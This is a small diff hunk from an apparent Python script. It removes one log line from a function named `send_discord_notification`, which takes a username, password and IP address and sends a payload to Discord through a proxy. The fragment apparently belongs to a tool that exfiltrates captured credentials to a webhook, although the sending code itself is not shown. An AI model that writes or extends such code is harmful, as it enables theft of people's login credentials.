@@ -229,7 +229,6 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
             "avatar_url": "https://cdn-icons-png.flaticon.com/512/1047/1047711.png"
         }
         
-        print(f"📤 Sending to Discord via proxy...")
         print(f"🔄 Using proxy: {PROXY.get('http', 'None')}")
         
         # Send to Discord using proxy
